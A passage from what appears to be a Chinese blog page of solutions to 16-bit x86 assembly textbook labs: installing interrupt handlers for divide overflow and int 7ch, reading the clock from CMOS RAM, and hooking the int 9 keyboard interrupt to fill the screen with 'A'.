<h2 id="实验12-编写0号中断的处理程序"><a href="#实验12-编写0号中断的处理程序" class="headerlink" title="实验12 编写0号中断的处理程序"></a>实验12 编写0号中断的处理程序</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset do0</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset do0end - offset do0</span><br><span class="line"></span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">0</span>], <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">2</span>], <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">do0:</span></span><br><span class="line"><span class="keyword">jmp</span> short do0start</span><br><span class="line"><span class="built_in">db</span> <span class="string">"overflow!"</span></span><br><span class="line"><span class="symbol">do0start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">202h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">12</span>*<span class="number">160</span>+<span class="number">36</span>*<span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">9</span></span><br><span class="line"><span class="symbol">s:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"><span class="symbol">do0end:</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="实验13-编写、应用中断例程"><a href="#实验13-编写、应用中断例程" class="headerlink" title="实验13 编写、应用中断例程"></a>实验13 编写、应用中断例程</h2><ol>
<li><p>编写并安装int 7ch中断例程，功能为显示一个用0结束的字符串，中断例程安装在0:200处。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset print</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset printend - offset print</span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">print:</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">di</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mul</span> <span class="number">dh</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="built_in">dx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">printstart:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">jmp</span> printstart</span><br><span class="line"></span><br><span class="line"><span class="symbol">zero:</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">di</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line"><span class="keyword">iret</span></span><br><span class="line"><span class="symbol">printend:</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写并安装int 7ch中断例程，功能为完成loop指令功能。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset lp</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset lpend - offset lp</span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">lp:</span>     <span class="keyword">push</span> <span class="built_in">bp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="built_in">sp</span></span><br><span class="line"><span class="keyword">dec</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">jcxz</span> lpret</span><br><span class="line"><span class="keyword">add</span> [<span class="built_in">bp</span> + <span class="number">2</span>], <span class="built_in">bx</span></span><br><span class="line"><span class="symbol">lpret:</span>  <span class="keyword">pop</span> <span class="built_in">bp</span></span><br><span class="line"><span class="keyword">iret</span></span><br><span class="line"><span class="symbol">lpend:</span>  <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
</li>
<li><p>下面的程序，分别在屏幕的第2、4、6、8行显示4句英文诗，补全程序。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">s1:</span>     <span class="built_in">db</span> <span class="string">'Good,better,best,'</span>, <span class="string">'$'</span></span><br><span class="line"><span class="symbol">s2:</span>     <span class="built_in">db</span> <span class="string">'Never let it rest,'</span>, <span class="string">'$'</span></span><br><span class="line"><span class="symbol">s3:</span>     <span class="built_in">db</span> <span class="string">'Till good is better,'</span>, <span class="string">'$'</span></span><br><span class="line"><span class="symbol">s4:</span>     <span class="built_in">db</span> <span class="string">'And better,best.'</span>, <span class="string">'$'</span></span><br><span class="line"><span class="symbol">s:</span>      <span class="built_in">dw</span> offset s1, offset s2, offset s3, offset s4</span><br><span class="line"><span class="symbol">row:</span>    <span class="built_in">db</span> <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, offset s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset row</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">ok:</span>     <span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">dh</span>, _____</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">10h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, _____</span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">9</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">_________</span><br><span class="line">_________</span><br><span class="line"><span class="keyword">loop</span> ok</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">si</span>]</span><br><span class="line">[<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验14-访问CMOS-RAM"><a href="#实验14-访问CMOS-RAM" class="headerlink" title="实验14 访问CMOS RAM"></a>实验14 访问CMOS RAM</h2><p>编程，以”年/月/日 时:分:秒”的格式，显示当前的日期，时间。<br>注意：CMOS RAM中存储着系统的配置信息，出了保存时间信息的单元外，不要向其他的单元中写入内容，否则将引起一些系统错误。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">s <span class="built_in">db</span> <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">data ends</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">160</span> * <span class="number">12</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">print:</span>  <span class="keyword">mov</span> <span class="built_in">al</span>, s[<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">71h</span></span><br><span class="line"><span class="keyword">call</span> number</span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">si</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">jb</span> slash</span><br><span class="line"><span class="keyword">je</span> space</span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">si</span>, <span class="number">5</span></span><br><span class="line"><span class="keyword">jb</span> colon</span><br><span class="line"><span class="symbol">next:</span>   <span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> print</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;al-&gt;number, es:di-&gt;begin</span></span><br><span class="line"><span class="symbol">number:</span> <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="built_in">al</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">shr</span> <span class="number">ah</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">00001111b</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="number">ah</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span> + <span class="number">2</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">slash:</span>  <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="string">'\'</span></span><br><span class="line"><span class="string">add di, 2</span></span><br><span class="line"><span class="string">jmp next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">colon:  mov byte ptr es:[di], '</span>:<span class="string">'</span></span><br><span class="line"><span class="string">add di, 2</span></span><br><span class="line"><span class="string">jmp next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">space:  mov byte ptr es:[di], '</span> <span class="string">'</span></span><br><span class="line"><span class="string">add di, 2</span></span><br><span class="line"><span class="string">jmp next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">code ends</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">end start</span></span><br></pre></td></tr></table></figure></p>
<h2 id="实验15-安装新的int-9中断例程"><a href="#实验15-安装新的int-9中断例程" class="headerlink" title="实验15 安装新的int 9中断例程"></a>实验15 安装新的int 9中断例程</h2><p>安装一个新的int 9中断例程，功能：在DOS下，按下’A’键后，除非不再松开，如果松开，就显示满屏幕的’A’；其他键照常处理。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="number">128</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cs</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset int9</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">204h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset int9end - offset int9</span><br><span class="line"><span class="keyword">cld</span></span><br><span class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span>: [<span class="number">200h</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span> + <span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span>: [<span class="number">202h</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">cli</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span>], <span class="number">204h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">sti</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">int9:</span>   <span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">60h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pushf</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">cs</span>:[<span class="number">200h</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">9eh</span></span><br><span class="line"><span class="keyword">jne</span> int9ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span 